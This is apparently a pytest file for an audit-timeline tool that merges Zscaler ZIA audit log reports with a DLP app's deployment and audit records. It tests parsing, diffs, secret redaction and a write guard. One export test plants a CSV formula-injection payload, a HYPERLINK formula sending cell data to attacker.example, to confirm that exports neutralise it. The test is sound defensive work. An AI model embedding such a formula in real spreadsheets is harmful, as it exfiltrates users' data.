"""Audit timeline: ZIA's admin audit log (through its audit log report
API) merged with Zscaler Made Easy's deployment records and its own audit log.
CSV fixtures with varied columns, ordering, provenance, diffs, the scope
refusal and secrets. Fakes only: no tenant is called.

Write guard, deliberately loosened: the fake tenants below accept exactly
one POST, to /zia/auditlogEntryReport. Creating an audit log report is a
POST, but it changes no configuration (ZIA prepares a file to download),
so the timeline treats it as a read; every other POST, PUT or DELETE
fails the test."""
from __future__ import annotations

import json
import time

import pytest
from requests.adapters import BaseAdapter
from requests.models import Response

import audit_timeline as at

ZIA_CSV = (
    '"Report Created:","Sat Oct 24 10:00:00 UTC 2026"\n'
    '"Time Range:","last 7 days"\n'
    '\n'
    'Time,Admin ID,Client IP,Interface,Action,Category,Sub-Category,Resource,Result,Pre-Action,Post-Action\n'
    '"October 20, 2026 10:15:30 AM",alice@corp.example,198.51.100.7,UI,Update,Data Loss Prevention,DLP Policy Rules,PCI block,SUCCESS,'
    '"{""id"": 77, ""name"": ""PCI block"", ""action"": ""ALLOW"", ""state"": ""DISABLED"", ""description"": ""Card data [Jane Doe pack pci v2] Deployed DISABLED; enable once reviewed.""}",'
    '"{""id"": 77, ""name"": ""PCI block"", ""action"": ""BLOCK"", ""state"": ""ENABLED"", ""description"": ""Card data [Jane Doe pack pci v2] Deployed DISABLED; enable once reviewed.""}"\n'
    '"October 21, 2026 08:00:00 AM",api-client-1,198.51.100.9,API,Create,Data Loss Prevention,DLP Dictionaries,Bank accounts,SUCCESS,,'
    '"{""id"": 501, ""name"": ""Bank accounts"", ""description"": ""Account numbers [Jane Doe pack banking v1]""}"\n'
    '"October 22, 2026 09:00:00 AM",bob@corp.example,198.51.100.8,UI,Sign In,Authentication,,,SUCCESS,,\n'
    '"October 23, 2026 11:30:00 AM",bob@corp.example,198.51.100.8,UI,Update,Administration,Admin Users,ops admin,SUCCESS,'
    '"{""loginName"": ""ops@corp.example"", ""password"": ""hunter2-old""}","{""loginName"": ""ops@corp.example"", ""password"": ""hunter2-new""}"\n'
    '"October 23, 2026 12:00:00 PM",carol@corp.example,198.51.100.9,UI,Update,Data Loss Prevention,DLP Engines,Customer engine,SUCCESS,'
    '"{""name"": ""Customer engine"", ""description"": ""Our own [Q3 pack review]""}","{""name"": ""Customer engine"", ""description"": ""Changed""}"\n'
)

VARIANT_CSV = (
    "﻿Timestamp;Admin Login;Operation;Resource Category;Object Name;Access Interface;Status;Old Value;New Value;Extra\n"
    "2026-10-22T07:00:00Z;dave@corp.example;DELETE;Firewall;Allow all;API;Failure;;;x\n"
    "1761200000000;erin@corp.example;EDIT;URL Filtering;Block gambling;UI;Success;plain before;plain after\n"
    "not a time;frank@corp.example;Activate;Activation;;UI;Success;;\n"
)


def test_zias_csv_is_read_with_a_preamble_and_every_raw_row_kept():
    out = at.parse_csv(ZIA_CSV)
    assert out["preamble"] == 2 and len(out["rows"]) == 5 and out["notes"] == []
    assert out["mapped"]["time"] == "Time" and out["mapped"]["admin"] == "Admin ID" and out["mapped"]["pre"] == "Pre-Action"
    r = out["rows"][0]
    assert (r["admin"], r["action"], r["category"], r["subcategory"], r["resource"], r["interface"], r["result"]) == \
        ("alice@corp.example", "Update", "Data Loss Prevention", "DLP Policy Rules", "PCI block", "UI", "SUCCESS")
    assert r["pre"]["action"] == "ALLOW" and r["post"]["action"] == "BLOCK" and r["raw"]["Client IP"] == "198.51.100.7"
    assert at.parse_time(r["time_raw"]).isoformat() == "2026-10-20T10:15:30+00:00"
    # Passwords in pre / post values are redacted, in the parsed value and the raw row alike.
    pw = out["rows"][3]
    assert pw["pre"]["password"] == "[redacted]" and "hunter2" not in json.dumps(out)


def test_other_column_names_delimiters_and_bad_rows_are_read_defensively():
    out = at.parse_csv(VARIANT_CSV)
    assert len(out["rows"]) == 3 and out["mapped"]["time"] == "Timestamp" and out["mapped"]["admin"] == "Admin Login"
    a, b, c = out["rows"]
    assert a["action"] == "DELETE" and a["category"] == "Firewall" and a["resource"] == "Allow all" and a["interface"] == "API" and a["result"] == "Failure"
    assert a["raw"]["Extra"] == "x" and a["pre"] is None
    assert at.parse_time(b["time_raw"]).year == 2025 and b["pre"] == "plain before" and b["post"] == "plain after"
    assert at.parse_time(c["time_raw"]) is None
    assert at.field_diff(b["pre"], b["post"]) == [{"field": "value", "before": "plain before", "after": "plain after", "change": "changed"}]
    # No header row at all: said, nothing invented.
    junk = at.parse_csv("just,some,words\n1,2,3\n")
    assert junk["rows"] == [] and "No header row" in junk["notes"][0]
    assert "empty" in at.parse_csv("")["notes"][0]
    # Ragged rows keep what they have; the extra cells too.
    rag = at.parse_csv("Time,Action,Admin\n2026-10-20 10:00:00,Update\n2026-10-20 11:00:00,Delete,x,y,z\n")
    assert rag["rows"][0]["admin"] == "" and rag["rows"][1]["raw"]["extra"] == ["y", "z"]
    assert "admin" not in at.parse_csv("Time,Action\n2026-10-20 10:00:00,Update\n")["mapped"]


@pytest.mark.parametrize("text, iso", [
    ("2026-10-20 10:15:30", "2026-10-20T10:15:30+00:00"), ("2026/10/20 10:15:30", "2026-10-20T10:15:30+00:00"),
    ("10/20/2026 10:15:30 PM", "2026-10-20T22:15:30+00:00"), ("Oct 20, 2026 10:15:30 AM", "2026-10-20T10:15:30+00:00"),
    ("Tue Oct 20 10:15:30 UTC 2026", "2026-10-20T10:15:30+00:00"), ("2026-10-20T10:15:30+0200", "2026-10-20T10:15:30+02:00"),
    ("1761000000", "2025-10-20T22:40:00+00:00"), ("2026-10-20T10:15:30Z", "2026-10-20T10:15:30+00:00"),
])
def test_times_are_read_in_the_forms_zia_and_the_app_write(text, iso):
    assert at.parse_time(text).isoformat() == iso


def test_the_field_level_diff_and_the_provenance_tag():
    pre = {"name": "PCI", "action": "ALLOW", "engines": [{"id": 1, "name": "PCI"}], "labels": ["a", "b"]}
    post = {"name": "PCI", "action": "BLOCK", "engines": [{"id": 1, "name": "PCI"}, {"id": 2, "name": "SSN"}], "labels": ["a"], "notes": "x"}
    d = {x["field"]: x for x in at.field_diff(pre, post)}
    assert d["action"] == {"field": "action", "before": "ALLOW", "after": "BLOCK", "change": "changed"}
    assert d["engines[SSN].id"]["change"] == "added" and d["labels"]["before"] == "a, b" and d["notes"]["change"] == "added"
    assert "name" not in d and at.field_diff(None, None) == []
    p = at.provenance({"description": "Card data [Jane Doe pack pci v2] Deployed DISABLED; enable once reviewed."})
    assert p["by"] == "Jane Doe" and p["pack"] == "pci" and p["version"] == "2" and p["kind"] == "pack"
    assert at.provenance({"description": "legacy [DLP-Check pack cjis v1]"})["pack"] == "cjis"
    assert at.provenance({"description": "Our own [Q3 pack review]"}) is None, "a customer's bracketed note is not a tag"
    assert at.provenance(None) is None and at.provenance("no tag here") is None


def _app_entry(event, at_, **kw):
    return dict({"at": at_, "event": event, "actor": "local UI token"}, **kw)


DEPLOYMENTS = [{"id": "dep-1", "at": "2026-10-19T09:00:00+00:00", "tenant_label": "acme (production)", "by": "Jane Doe", "packs": ["pci"],
                "status": "applied", "created": [{"kind": "policy", "name": "PCI block", "id": 77, "channel": "web"},
                                                  {"kind": "engine", "name": "Customer engine", "id": 9}], "undo": None},
               {"id": "dep-2", "at": "2026-10-19T09:30:00+00:00", "tenant_label": "other (production)", "by": "Sam", "packs": ["hipaa"],
                "status": "applied", "created": [{"kind": "policy", "name": "PHI", "id": 5}], "undo": None}]

AUDIT = [
    _app_entry("object_write", "2026-10-21T08:05:00+0000", tenant="acme (production)", action="create", object_type="dictionary",
               channel=None, id=501, name="Bank accounts", result="ok", http_status=200),
    _app_entry("job_finished", "2026-10-21T08:10:00+0000", kind="deploy", label="banking", status="done", tenant="acme (production)",
               counts={"created": 1, "updated": 0}),
    _app_entry("object_write", "2026-10-21T08:05:00+0000", tenant="other (production)", action="create", object_type="policy", name="PHI", result="ok"),
    _app_entry("api", "2026-10-22T10:00:00+0000", method="POST", path="/api/write-mode", status=200, body={"enable": True}),
    _app_entry("api", "2026-10-22T10:01:00+0000", method="POST", path="/api/dlp-packs/preflight", status=200, body={}),
    _app_entry("proposal_decision", "2026-10-22T11:00:00+0000", tenant="t", proposal="p1", kind="tune", target="PCI block", decision="approve", by="Jane Doe"),
    {"garbage": True}, "not a dict",
]

WIN = at.window(start="2026-10-18", end="2026-10-24", now=time.mktime((2026, 10, 25, 0, 0, 0, 0, 0, 0)))


def _built(rows_csv=ZIA_CSV, labels=("acme (production)",)):
    zia = {"status": "read", "error": None, "csv": at.parse_csv(rows_csv)}
    return at.build(window_=WIN, zia=zia, deployments=DEPLOYMENTS, audit_entries=AUDIT, labels=list(labels), known_packs={"pci", "banking"},
                    tenant_label="acme (production)")


def test_one_timeline_newest_first_with_changes_by_someone_else_marked():
    out = _built()
    ev = out["events"]
    times = [e["ts"] for e in ev if e["ts"] is not None]
    assert times == sorted(times, reverse=True) and ev[0]["ts"] is not None
    assert {e["source"] for e in ev} == {"zia", "deployment", "app"}
    by = {(e["source"], e["action"], e["object"]): e for e in ev}
    # Alice enabled and hardened the rule a pack deployed, and no Zscaler Made Easy write explains it.
    alice = by[("zia", "Update", "PCI block")]
    assert alice["dlp_check_object"] and alice["foreign_change"] and "Jane Doe" in alice["foreign_reason"] and "alice@corp.example" in alice["foreign_reason"]
    assert alice["provenance"]["pack"] == "pci" and alice["category"] == "Data Loss Prevention / DLP Policy Rules"
    assert {d["field"]: (d["before"], d["after"]) for d in alice["diff"]} == {"action": ("ALLOW", "BLOCK"), "state": ("DISABLED", "ENABLED")}
    # The dictionary Zscaler Made Easy created itself (an object_write 5 minutes later) is its own, not someone else's.
    mine = by[("zia", "Create", "Bank accounts")]
    assert mine["dlp_check_object"] and not mine["foreign_change"]
    # Carol changed an engine the deployment record lists (no tag in its description): still Zscaler Made Easy's object.
    carol = by[("zia", "Update", "Customer engine")]
    assert carol["dlp_check_object"] and carol["foreign_change"] and "deployment record" in carol["foreign_reason"] and carol["provenance"] is None
    # A sign-in and a change to an object Zscaler Made Easy never made are not marked.
    assert not by[("zia", "Sign In", "")]["foreign_change"] and not by[("zia", "Update", "ops admin")]["dlp_check_object"]
    # Zscaler Made Easy's own records: this tenant's only; the write-mode switch kept, other api lines left out.
    assert ("deployment", "Deploy policy packs", "PCI block, Customer engine") in by and not any(e["tenant"] == "other (production)" for e in ev)
    assert ("app", "Write mode on", "") in by and not any("preflight" in json.dumps(e) for e in ev)
    assert ("app", "create dictionary", "Bank accounts") in by and ("app", "proposal decision", "PCI block") in by
    s = out["summary"]
    assert s["foreign_changes"] == 2 and s["zia"] == 5 and s["deployment"] == 1 and s["with_diff"] >= 3
    assert "hunter2" not in json.dumps(out)


def test_events_outside_the_window_or_without_a_time_are_said():
    out = _built(VARIANT_CSV, labels=())
    assert any("outside the window" in n for n in out["notes"]), "1761200000000 is 2025, before the window"
    assert out["events"][-1]["time_raw"] == "not a time" and out["events"][-1]["ts"] is None
    assert any("could not read" in n for n in out["notes"])
    with pytest.raises(ValueError, match="longer than 180 days"):
        at.window(days=181)
    with pytest.raises(ValueError, match="before its end"):
        at.window(start="2026-10-20", end="2026-10-10")
    assert at.window(days=7)["days"] == 7


def test_the_csv_export_is_spreadsheet_safe():
    out = _built()
    out["events"][0]["object"] = '=HYPERLINK("http://attacker.example/?d="&A1,"Click")'
    text = at.to_csv(out["events"])
    assert text.splitlines()[0] == ",".join(at.EXPORT_COLUMNS)
    assert "'=HYPERLINK" in text and "action: ALLOW -> BLOCK" in text


# ---------------------------------------------------------------------------
# Reading ZIA's audit log report
# ---------------------------------------------------------------------------

class FakeTenant:
    """ZIA's audit log report API. The one POST it accepts is the report's
    creation (see the module docstring); anything else is a write."""

    def __init__(self, statuses=("EXECUTING", "COMPLETE"), csv_text=ZIA_CSV, create_status=204):
        self.calls = []
        self.statuses = list(statuses)
        self.csv_text = csv_text
        self.create_status = create_status

    def post(self, ep, body=None):
        self.calls.append(("POST", ep, body))
        assert ep == "/zia/auditlogEntryReport", f"the timeline wrote to the tenant: POST {ep}"
        return ({}, self.create_status)

    def put(self, ep, body=None):
        raise AssertionError(f"the timeline wrote to the tenant: PUT {ep}")

    def delete(self, ep, body=None):
        raise AssertionError(f"the timeline wrote to the tenant: DELETE {ep}")

    def get_text(self, ep, p=None, accept="*/*", max_bytes=0):
        self.calls.append(("GET", ep, None))
        if ep == "/zia/auditlogEntryReport":
            st = self.statuses.pop(0) if len(self.statuses) > 1 else self.statuses[0]
            return json.dumps({"status": st, "progressItemsComplete": 3}), 200
        if ep == "/zia/auditlogEntryReport/download":
            return self.csv_text, 200
        raise AssertionError(ep)

    def get(self, ep, p=None):
        raise AssertionError("status and download are read uncached (get_text)")


def test_the_report_is_created_polled_and_downloaded():
    t = FakeTenant(statuses=("EXECUTING", "EXECUTING", "COMPLETE"))
    logs = []
    out = at.read_zia_audit(t, 1000, 2000, log=logs.append, poll_seconds=0)
    assert out["status"] == "read" and len(out["csv"]["rows"]) == 5
    assert t.calls[0] == ("POST", "/zia/auditlogEntryReport", {"startTime": 1000, "endTime": 2000})
    assert [c[1] for c in t.calls[1:]] == ["/zia/auditlogEntryReport"] * 3 + ["/zia/auditlogEntryReport/download"]
    assert "changes no configuration" in logs[0] and any("3 entries" in l for l in logs)
    # Refusals and failed reports are said in words, nothing downloaded.
    t = FakeTenant(create_status=403)
    out = at.read_zia_audit(t, 1, 2, poll_seconds=0)
    assert out["status"] == "failed" and "HTTP 403" in out["error"] and "audit log" in out["error"] and len(t.calls) == 1
    t = FakeTenant(statuses=("CANCELLED",))
    out = at.read_zia_audit(t, 1, 2, poll_seconds=0)
    assert "CANCELLED" in out["error"] and not any(c[1].endswith("download") for c in t.calls)
    t = FakeTenant(statuses=("EXECUTING",))
    out = at.read_zia_audit(t, 1, 2, poll_seconds=0, timeout=0)
    assert "had not finished" in out["error"]


def test_stop_while_zia_prepares_the_report_reads_nothing_more():
    import threading
    t = FakeTenant(statuses=("EXECUTING",))
    cancel = threading.Event()
    real = t.get_text

    def get_text(ep, **kw):
        cancel.set()
        return real(ep, **kw)
    t.get_text = get_text
    with pytest.raises(at.Stopped, match="You clicked Stop"):
        at.read_zia_audit(t, 1, 2, cancel=cancel, poll_seconds=0)
    assert not any(c[1].endswith("download") for c in t.calls) and [c[0] for c in t.calls].count("POST") == 1
    t2 = FakeTenant()
    with pytest.raises(at.Stopped):
        at.read_zia_audit(t2, 1, 2, cancel=lambda: True)
    assert t2.calls == [], "stopped before anything was asked"


class _Adapter(BaseAdapter):
    def __init__(self, answers, log):
        super().__init__()
        self.answers, self.log = answers, log

    def send(self, request, **kwargs):
        code, body = self.answers[request.url.split("?")[0].rsplit("/api/v1", 1)[-1]]
        r = Response()
        r.request, r._content, r.status_code, r._content_consumed = request, body.encode(), code, True
        r.encoding = "utf-8"
        self.log.append((request.method, request.url, request.headers.get("Accept")))
        return r

    def close(self):
        pass


def test_the_assessment_client_reads_text_uncached():
    import dlp_assessment_full_auto as full
    log = []
    c = full.Client("cid-123456", "secret-secret-xyz", "acme.com", "zscaler")
    c.sess.mount("https://", _Adapter({"/auditlogEntryReport": (200, '{"status": "EXECUTING"}'),
                                       "/auditlogEntryReport/download": (200, ZIA_CSV),
                                       "/missing": (404, "secret-secret-xyz not here")}, log))
    c.token, c.exp = "t", time.time() + 3600
    assert c.get_text("/zia/auditlogEntryReport") == ('{"status": "EXECUTING"}', 200)
    assert c.get_text("/zia/auditlogEntryReport")[1] == 200 and len(log) == 2, "a status poll is never answered from the cache"
    text, code = c.get_text("/zia/auditlogEntryReport/download", accept="text/csv")
    assert code == 200 and text == ZIA_CSV and log[-1][2] == "text/csv"
    assert c.get_text("/zia/auditlogEntryReport/download", max_bytes=10)[1] == 413
    text, code = c.get_text("/zia/missing")
    assert code == 404 and "secret-secret-xyz" not in text
    c.stop()
    assert c.get_text("/zia/auditlogEntryReport") == ("run stopped", 0) and len(log) == 5


# ---------------------------------------------------------------------------
# The endpoint
# ---------------------------------------------------------------------------

CREDS = {"vanity_domain": "acme", "client_id": "abc123456789", "client_secret": "secret-secret-secret"}
IN_SCOPE = {"scopes": ["dlp", "automation"], "channels": {"web_dlp": "zscaler"}, "from_page": True}


def _follow(t, job):
    deadline = time.time() + 30
    while time.time() < deadline:
        snap = t.get(f"/api/dlp-packs/jobs/{job}").json()
        if snap["status"] != "running":
            return snap
        time.sleep(0.05)
    raise AssertionError("job did not finish")


@pytest.fixture()
def records(monkeypatch, tmp_path):
    dep = tmp_path / "deployments.json"
    dep.write_text(json.dumps({"version": 1, "deployments": DEPLOYMENTS}), encoding="utf-8")
    monkeypatch.setenv("DLP_CHECK_DEPLOYMENTS", str(dep))
    audit_log = tmp_path / "audit.log"
    audit_log.write_text("".join(json.dumps(a) + "\n" for a in AUDIT if isinstance(a, dict)), encoding="utf-8")
    monkeypatch.setenv("DLP_CHECK_AUDIT", str(audit_log))
    monkeypatch.setattr(at, "POLL_SECONDS", 0)
    return tmp_path


def test_the_zia_part_is_refused_before_any_call_when_automation_is_not_in_scope(monkeypatch, records):
    import dlp_api_server as srv
    from fastapi.testclient import TestClient

    def no_sign_in(req):
        raise AssertionError("signed in before the scope was checked")
    monkeypatch.setattr(srv, "_build_client", no_sign_in)
    t = TestClient(srv.app)
    r = t.post("/api/audit-timeline/start", json=dict(CREDS, scopes=["dlp"], channels={"web_dlp": "zscaler"}, from_page=True))
    assert r.status_code == 400 and "Automation" in r.json()["detail"] and "Nothing was read" in r.json()["detail"]
    assert "secret-secret-secret" not in r.text
    r = t.post("/api/audit-timeline/start", json={**CREDS, **IN_SCOPE, "days": 400})
    assert r.status_code == 400 and "180 days" in r.json()["detail"]
    # Zscaler Made Easy's own records alone need no sign-in and no scope.
    r = t.post("/api/audit-timeline/start", json={"include_zia": False, "start": "2026-10-18", "end": "2026-10-24"})
    assert r.status_code == 200, r.text
    snap = _follow(t, r.json()["job_id"])
    res = snap["result"]
    assert snap["status"] == "done" and res["zia"]["requested"] is False and res["summary"]["zia"] == 0
    assert res["summary"]["deployment"] == 2 and any("not read" in n for n in res["notes"]), "every tenant's records without the ZIA part"


def test_the_timeline_job_merges_reads_and_exports_without_secrets(monkeypatch, records):
    import dlp_api_server as srv
    from fastapi.testclient import TestClient
    tenant = FakeTenant()
    monkeypatch.setattr(srv, "_build_client", lambda req: tenant)
    t = TestClient(srv.app)
    r = t.post("/api/audit-timeline/start", json={**CREDS, **IN_SCOPE, "start": "2026-10-18", "end": "2026-10-24"})
    assert r.status_code == 200 and r.json()["kind"] == "audit-timeline", r.text
    snap = _follow(t, r.json()["job_id"])
    assert snap["status"] == "done", snap.get("error")
    res = snap["result"]
    assert res["tenant_label"] == "acme (production)" and res["summary"]["foreign_changes"] == 2 and res["zia"]["status"] == "read"
    assert [c[0] for c in tenant.calls].count("POST") == 1, "one report created, nothing else posted"
    assert not any(e["tenant"] == "other (production)" for e in res["events"])
    blob = json.dumps(snap)
    for secret in ("secret-secret-secret", "hunter2"):
        assert secret not in blob, secret
    csv_text = t.get(f"/api/audit-timeline/{r.json()['job_id']}/export?format=csv").text
    assert "alice@corp.example" in csv_text and "Changed by someone else" in csv_text and "hunter2" not in csv_text
    js = t.get(f"/api/audit-timeline/{r.json()['job_id']}/export?format=json").json()
    assert js["summary"] == res["summary"] and js["events"][0]["raw"] is not None or js["events"][0]["source"] != "zia"
    assert t.get("/api/audit-timeline/nope/export").status_code == 404
    # Stop before the start answered: nothing is asked of ZIA.
    tenant2 = FakeTenant()
    monkeypatch.setattr(srv, "_build_client", lambda req: tenant2)
    token = "auditstop12345678"
    t.post("/api/dlp-packs/jobs/stop-before-start", json={"start_token": token})
    r = t.post("/api/audit-timeline/start", json={**CREDS, **IN_SCOPE}, headers={"X-Start-Token": token})
    snap = _follow(t, r.json()["job_id"])
    assert snap["status"] == "cancelled" and tenant2.calls == []


def test_the_page_is_served_wired_and_explained():
    import os
    import re
    import dlp_api_server as srv
    from fastapi.testclient import TestClient
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    r = TestClient(srv.app).get("/report/audit")
    assert r.status_code == 200 and "no-cache" in r.headers["cache-control"]
    html = r.text
    for needle in ('<header class="hero rp-hero">', '<nav class="rp-bar" aria-label="Page actions">', 'href="/"', "<main", "<h1>",
                   'id="liveRegion" class="sr-only" role="status" aria-live="polite"', 'role="log"', "/api/audit-timeline/start",
                   "/api/dlp-packs/jobs/", "stop-before-start", 'aria-expanded', '<th scope="col">', "changes no configuration", "Automation readiness"):
        assert needle in html, needle
    order = [html.index(f'<script src="/static/{s}"></script>') for s in ("icons.js", "ui_auth.js", "report_theme.js", "safety_banner.js", "explain.js")]
    assert order == sorted(order)
    assert not re.search(r"#[0-9a-fA-F]{3,6}\b", html.split("<style>")[1].split("</style>")[0]), "theme tokens only"
    assert "prefers-reduced-motion" in html and ":focus-visible" in html
    index = open(os.path.join(root, "static", "index.html"), encoding="utf-8").read()
    assert index.index('onclick="openAuditTimelineTab()"') < index.index('onclick="openLogAnalyzerTab()"')
    assert "window.open('/report/audit', '_blank')" in index
    explain = open(os.path.join(root, "static", "explain.js"), encoding="utf-8").read()
    assert explain.index("  X.audit = {") < explain.index("  X.logs = {") and "'/report/audit': 'audit'" in explain
    assert "group: 'Troubleshoot', name: 'Audit timeline'" in explain and "'audit', 'logs'" in explain
